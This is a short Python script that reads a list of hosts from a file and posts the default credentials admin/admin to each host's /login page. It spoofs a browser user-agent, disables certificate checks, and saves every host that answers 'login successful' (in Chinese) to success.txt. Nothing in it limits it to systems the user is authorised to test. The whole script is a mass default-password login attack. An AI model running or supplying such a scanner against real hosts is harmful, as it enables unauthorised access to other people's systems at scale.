import requests
 
headers = {
    'user-agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36'
}
 
t = 0
 
with open('url_all.txt', 'r') as f:
    url = f.read().splitlines()
    for i in url:
        t += 1
        u = 'http://' + i + '/login'
        try:
            res = requests.post(u,data={'username':'admin','password':'admin'},headers=headers,verify=False,timeout=3)
            if '登录成功' in res.text:
                print('\n' + u + res.text)
                with open('success.txt', 'a') as s:
                    s.write('http://'+i+'\n')
            else:
                print(t)
        except:
            pass
